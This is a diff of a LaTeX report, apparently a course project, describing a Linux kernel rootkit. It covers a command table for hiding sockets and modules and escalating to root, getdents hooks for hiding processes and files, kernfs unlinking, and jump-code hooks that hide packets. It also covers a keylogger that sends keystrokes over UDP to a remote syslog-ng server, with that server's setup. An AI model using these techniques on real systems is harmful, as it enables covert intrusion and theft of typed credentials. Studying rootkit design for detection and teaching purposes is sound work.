@@ -39,8 +39,7 @@ Compilation, installation and controlling is explained in the coming sections.
 \subsection{System configuration}
 This rootkit has been implemented and tested on the following configuration.
 \begin{itemize}
-    \item Linux Kernel 3.16.4 (Venilla )
-    \item xz-utils and build-essential:\# aptitude install xz-utils build-essential for debian 
+    \item Linux Kernel 3.16.4 (Vanilla kernel) 
 \end{itemize}
 
 \subsection{Building}
@@ -65,7 +64,7 @@ This rootkit has been implemented and tested on the following configuration.
 For this, we hook the read system call and intercept data from stdin and take actions for each existing  commands. 
 We use a state machine model (which will be described later) to read the data and look for specific commands entered. 
 
-%TODO : Add commands details once done with coding
+%TODO : Add command details once done with coding
 Each command starts with a prefix(For detecting purpose), \texttt{f7R\_} and ends with ;. 
 After the prefix one can enter the actual command. The format of the command looks like,
 \\~
@@ -96,7 +95,7 @@ gives the available commands and their use.
 \texttt{f7R\_hide\_tcp\textvisiblespace<port>;} & \texttt{<port>} is the port number of tcp socket to be hidden\\
 \texttt{f7R\_unhide\_tcp\textvisiblespace<port>;} & To unhide the tcp socket\\
 \texttt{f7R\_hide\_udp\textvisiblespace<port>;} & \texttt{<port>} is the port number of udp socket to be hidden\\
-\texttt{f7R\_unhide\_udp\textvisiblespace<port>;} & To unhide the udp socket\\ \hline
+\texttt{f7R\_unhide\_udp\textvisiblespace<port>;} & To unishie the udp socket\\ \hline
 
 \multicolumn{2}{ |c| }{Module hiding} \\
 \hline
@@ -111,7 +110,8 @@ gives the available commands and their use.
 
 \multicolumn{2}{ |c| }{Previlage escalation} \\
 \hline
-\texttt{f7R\_escalate;} & type this from any terminal, that will get root previlages.\\ \hline
+\texttt{f7R\_escalate;} & Type this from any terminal, that will get root previleges.\\ 
+\texttt{f7R\_deescalate;} & Revokes the root previleges of a shell.\\ \hline
 
 \end{tabular}
 \caption{Commands to control the rootkit}
@@ -119,6 +119,36 @@ gives the available commands and their use.
 \end{table}
 
 \section{Implementation}
+This section explains how our\_module is designed and how do we achieve specific functionality. 
+
+\subsection{High-level design}
+our\_module is divided into many sub-modules(files). Each submodules have .h (header files) and .c (implemetation files).
+This gives us a lot of flexibility to add or remove any feature.
+
+\texttt{main.c} combines every functionality and that's where we have \texttt{init\_module} and \texttt{cleanup\_module}.
+The following table describes the functionality of each file.
+
+
+
+\begin{tabular}{l*{6}r}
+File name             & Functionality \\
+\hline
+gensysmap.sh & Bach script to generate sysmap.h file\\
+control.\{c,h\} & Manages the data structures for diffrent hiding methods\\
+include.\{c,h\} & contains many different helper functions   \\
+covert\_communication.\{c,h\} & All functionality needed for the covert communication channel \\
+getdents.\{c,h\} & contains everything needed for the manipulated getdents syscall\\
+read.\{c,h\} & Hookes the read system call \\
+hide\_module.\{c,h\} & Functionality needed for hiding the modules\\
+hide\_socket.\{c,h\} & Contains all necessary things for hiding sockets\\
+hide\_packet.\{c,h\} & Contains all necessary things for hiding packets\\
+port\_knocking.\{c,h\} & Functionlity needed for port knocking\\
+net\_keylog.\{c,h\} & Contains netpoll APIs for implementing network logging\\
+
+\end{tabular}
+
+
+
 
 \subsection{Obtaining address of kernel symbols}
 The kernel symbols are important in writing various modules. Many of the kernel symbols are not easily available through libraries 
@@ -187,7 +217,7 @@ The 16th bit controls page protection enforcement:
 toggling this bit turns of the write protection for the complete processor.
 We can do this in kernel space, because the code is executed at privilege level (ring) 0. 
 
-\subsection{Process hiding}
+\subsection{Process Hiding}
 The task was to hide process ids, which user enters when inserting the module. 
 To check the processes, we can do \texttt{ls} on \texttt{/proc} directory. 
 \texttt{ps} also does an \texttt{ls} on \texttt{/proc} folder.   
@@ -207,33 +237,44 @@ dirp->d\_name is the name of each entry inside the folder.
 So we first need to convert this char entry to integer and compare with the pid which we want to hide.
 If it matches, then we delete the entry. 
 
-\subsection{File hiding}
+\subsection{File Hiding}
 The task was to hide any file names starting with rootkit\_ and to hide any open file descriptors, 
 starting with that name. we hook \texttt{getdents} function as we did it for process hiding. 
 We simply call original getdents function and iterate over linux\_dirent structures.
 we search for d\_name matching to a prefix, \texttt{rootkit\_} or \texttt{.rootkit\_}. 
 If we find the match, we just {\em delete} it by moving the pointer using \texttt{memmove}.
 
-%TODO: @mher:Could you please add details for hiding symlinks 
+@mher:Could you please add details for hiding symlinks 
 
-\subsection{Code hiding}
+\subsection{Code Hiding}
 We can get the information on loaded modules using \texttt{lsmod}
 (which lists the entries from \texttt{/proc/modules}) and entries in \texttt{/sys/modules}
 
 \texttt{Hiding the module from /proc/modules}: All the modules in the kernel are arranged as linked list, 
-where each list of type \texttt{struct module}. 
+where each list of type \texttt{struct module}. \texttt{THIS\_MODULE} macro which points to the current module. 
 To hide it from lsmod we just need to delete the perticular entry from the list of modules. 
 This can be easily achieved via list operations defined in \texttt{list.h}:\texttt{list\_del}, 
 \texttt{list\_add\_tail}, \texttt{list\_add}. Once removed from the list of modules, 
 it will not show up anymore when using \texttt{lsmod}. 
 
-\texttt{Hiding the module from /sys/modules}: Deleting from \texttt{/sys/modules} was tricky part. 
-Just deleting from the list of modules, 
-will not stop showing it up from \texttt{/sys/modules}. 
+\texttt{Hiding the module from /sys/modules}: Deleting from \texttt{/sys/modules} was a tricky part. 
+Just deleting from the list of modules, will not stop showing it up from \texttt{/sys/modules}.
+This we can do by two different methods. By hacking the \texttt{filldir} function or by deleting it from the 
+kernel file system. If we do this by using first method our\_module will be easily detectable. 
+% add how: One can count the number of modules from 
+So we decided to delete the entry from the kernel file system. \texttt{THIS\_MODULE} points to kernel object. 
+If we delete this kernel object of type \texttt{struct kernfs\_node}, then it will not show up from from \texttt{/sys/modules}. 
+In recent versions of kernel, the kernel objects are implemented as red-black trees. 
+There are functions defined in \texttt{rbtree.h} to perform this operation. 
 
-TODO: gmc: add details about removing kernfs\_node. 
+\begin{verbatim}
+rb_erase(&kn->rb, &kn->parent->dir.children);
+RB_CLEAR_NODE(&kn->rb);
+\end{verbatim}
 
-\subsection{Network key-logging}
+%TODO: gmc: add details about removing kernfs\_node. 
+
+\subsection{Network Key-logging}
 We had the local key-logging already enabled in our root-kit by hooking \texttt{read} system call. 
 We just had to send this keys to \texttt{syslog-ng} server, using syslog protocol. 
 These packets can be sent using \texttt{UDP} packets using \texttt{netpoll} kernel API. 
@@ -274,12 +315,39 @@ netpoll_send_UDP(np, sned_buf, send_len);
 
 \texttt{Getting the PID information}: This was quite simple, as the \texttt{current} macro was quite handy in this situation.
 \texttt{current} macro points to the \texttt{task\_struct} of the currently executing process. 
-\texttt{task\_struct} has the \texttt{pid} member
-. 
+\texttt{task\_struct} has the \texttt{pid} member. 
 
-\texttt{Setting up syslog-ng server}: TODO: gmc 
 
-\subsection{Privilege escalation}
+\texttt{Setting up syslog-ng server}: One must set the \texttt{syslog-ng} server in the destination. 
+The following steps are for setting the syslog-ng server on ubuntu. 
+\begin{itemize}
+\item Install the syslog-ng server: sudo apt-get install syslog-ng
+
+\item Add these entries in \texttt{syslog-ng.conf} file (you can find the file under /etc/syslog-ng/ folder)
+\begin{verbatim}
+source syslog_udp {
+udp(port(514));
+};
+destination df_wrt0 {
+file("/var/log/rootkit_log.log");
+};
+log {
+source(syslog_udp);
+destination(df_wrt0);
+}
+filter f_wrt0 {
+host("Ip from you are getting the data");
+};
+log {
+source(syslog_udp);
+filter(f_wrt0);
+destination(df_wrt0);
+}
+\end{verbatim}
+
+\end{itemize}
+
+\subsection{Privilege Escalation}
 To give the root privilages to any shell, we have to hack the credentials of the perticular shell and 
 manipulate them. There is a structure called \texttt{cred}: 
 It holds the credentials of the respective process. These credentials are uids and gids. 
@@ -294,7 +362,7 @@ Once we get the credentials, we can assign all the ids to 0, and we will give th
 Sicne we have hooked read system call, 
 we can type \texttt{escalate} from any terminal and it gets the root access. 
 
-\subsection{Socket hiding}
+\subsection{Socket Hiding}
 The task was to hide any existing TCP/UDP sockets from the user. 
 User can determine the socket details using \texttt{ss} and \texttt{netstat} commands.
 The idea was to determine how netstat and ss works, 
@@ -329,14 +397,75 @@ Once we find the port number that we want to hide,
 we copy the remaining entries and decrease the length of the original function and call it.
 
 
-\subsection{Packet hiding}
+\subsection{Packet Hiding}
 Our goal was to hide any network packets from any process which uses libcap to  sniff packets.
-At first we wanted to understand how libcap tools work to sniff packets. 
+At first we wanted to understand how libcap tools work to sniff packets. \texttt{strace} on tcpdump gave us some usefull information. It uses packet sockets and then socket is polled every second to retrieve the information.   
 
-\subsection{Port knocking}
+\begin{verbatim}
+socket(PF_PACKET, SOCK_RAW, 768)        = 3
+poll([{fd=3, events=POLLIN}], 1, 1000)  = 0 (Timeout)
+\end{verbatim} 
+
+Some further investigations of libcap lead us to understand that, these three functions are involved in getting the packet information.\texttt{packet\_rcv}, \texttt{tpacket\_rcv}, \texttt{packet\_rcv\_spkt}. These functions give the packet information to user space when {\em memory mapped} sockets are used.
+
+So we decided to hook the these functions. 
+We use {\em jump code injection} method to hook these functions. This means that we copy (assembly)
+code at the top of the function body which leads to a jump to our (hooked) function. Whenever we need to call
+the original function, we have to overwrite this section with the original code again and do an ordinary call to
+it. We used \texttt{push-ret} method to perform jump. 
+We \texttt{push} the address on top of the stack and issue a \texttt{ret} instruction.
+
+\begin{verbatim}
+char hook[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
+unsigned int *target = (unsigned int *) (hook + 1);
+\end{verbatim} 
+
+In the hooked functions, we call \texttt{is\_packet\_hidden} function with \texttt{struct sk\_buff} as parameter.
+We just extract the ip header from \texttt{sk\_buff} and check if we want to hide this ip address and return the values accrodingly. 
+If we donot want to hide the packet in the hooked function, we just restore original, call it, hook again. 
+  
+\subsection{Port Knocking}
+To implement rudimentary port knocking feature, we accept the service that we want to hide and an ip address 
+from which the connections are accepted. To implement this we use Netfilter hooks. Netfilter is a set of hooks inside Linux kernel. 
+It allows kernel modules to register callback functions with the network stack in order to intercept and manipulate the network packet.
+
+The IPv4 packet traversal through Netfilter system is illustrated in figure \ref{netfilter}, 
+\begin{figure*}
+\centerline{
+\includegraphics[width=1.0\columnwidth]{netfilter.jpg}
+}
+\caption{Netfilter System hook}
+% A label to allow refering to this figure in the text.
+\label{netfilter}
+\end{figure*}
+
+When a network packet comes in, it is passed to the netfilter’s first hook \texttt{NF\_INET\_PRE\_ROUTING}. After that, the packet goes through the routing code, which decides where the packet is destined to, either another port in same network interface or another interface. It also might drop the packet if it’s unroutable. So we hook netfilter function like below. 
+
+\begin{verbatim}
+        /* setup everything for the netfilter hook */
+        hook.hook = knocking_hook;              /* our function */
+        hook.hooknum = NF_INET_LOCAL_IN;        /* grab everything that comes in */
+        hook.pf = PF_INET;                      /* we only care about ipv4 */
+        hook.priority = NF_IP_PRI_FIRST;        /* respect my prioritah */
+
+        /* actually do the hook */
+        ret = nf_register_hook(&hook);
+\end{verbatim} 
+
+And in the hooked function, we extract the ip header from \texttt{sk\_buff} and check if the port is blocked, depending on that we then craft an appropriate \texttt{REJECT} response. For TCP we send \texttt{TCP RST} and for UDP we send icmp port unreachable. If the port is allowed to connect we send \texttt{NF\_ACCEPT} to allow the connection.
+
+\section{Vulnerabilities}
+Though our\_module can perform operations in stealth mode, our module could be detected via certain methods. 
+
+\texttt{Detection via hooked system calls}: We hook many system calls \texttt{read}, \texttt{getdents} etc. 
+The original address of these functions can be obtained from System map files. 
+If the user writes a module where he checks the address in the system call table against the address from the Sysmap file it can be easily found out, unless we modify the Sysmap file or delete it from the system. 
+
+\texttt{Detection via process ids}
+
+\texttt{Detection via hidden files}
+
+\section{Final words}
 
 
-\section{Rootkit detection}
-
-\section{Summary}
 \end{document}
